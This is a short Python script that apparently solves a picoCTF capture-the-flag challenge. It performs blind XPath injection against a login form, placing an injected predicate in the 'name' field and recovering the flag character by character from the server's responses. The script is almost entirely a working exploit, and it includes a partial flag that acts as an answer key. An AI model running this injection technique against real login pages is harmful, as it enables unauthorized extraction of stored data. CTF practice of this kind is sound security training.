import requests
alphabet = "_abcdefghijklmnopqrstuvwxyz1234567890()ABCDEFGHIJKLMNOPQRSTUVXWYZ{}"
s = requests.Session()
flag = "picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_"
while flag[-1] != '}':
    for i in range(len(alphabet)):
        try:
            r = s.post("http://mercury.picoctf.net:7029/", data={
                       "name": "bob' and //*[contains(text(),'"+flag+alphabet[i]+"')] or ''='", "pass": "admin"}, timeout=1)
            if ("Login failure" not in r.text):
                flag += alphabet[i]
                print("[+] Flag: " + flag, flush=True)
                break
        except:
            i -= 1
